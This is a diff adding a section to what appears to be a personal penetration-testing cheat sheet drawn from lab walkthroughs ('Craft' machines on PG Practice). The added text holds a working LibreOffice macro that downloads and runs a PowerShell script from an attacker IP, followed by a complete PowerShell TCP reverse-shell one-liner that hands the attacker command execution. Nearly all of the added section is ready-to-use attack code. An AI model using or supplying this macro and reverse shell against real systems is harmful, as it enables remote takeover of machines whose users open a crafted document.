@@ -2381,6 +2381,22 @@ whoami
 
 ## Sensitive Information
 
+### Powershell one liner, macro exploit
+- Here is the Powershell tcp one-liner [github](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1)
+- In application accepting only .odt(LibreOffice) file, in that we are adding the macro that get shell code from kali download into local windows then run script get shell back to kali.
+- Craft, Craft2 machines from PG Practice walkthrough
+```powershell
+# In libreoffice -> Tools -> Macros -> Organize Macros -> Basic (Below code in macro, below code is offsec.ps1 )
+Sub Main
+	Shell("cmd /c powershell iwr http://192.168.45.214/offsec.ps1 -o C:/Windows/Tasks/offsec.ps1")
+	Shell("cmd /c powershell -c C:/Windows/Tasks/offsec.ps1")
+End Sub
+```
+- code of offsec.ps1
+```powershell
+$client = New-Object System.Net.Sockets.TCPClient('192.168.45.214',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```
+
 ### Powershell run command
 - Run the PowerShell command
 ```powershell
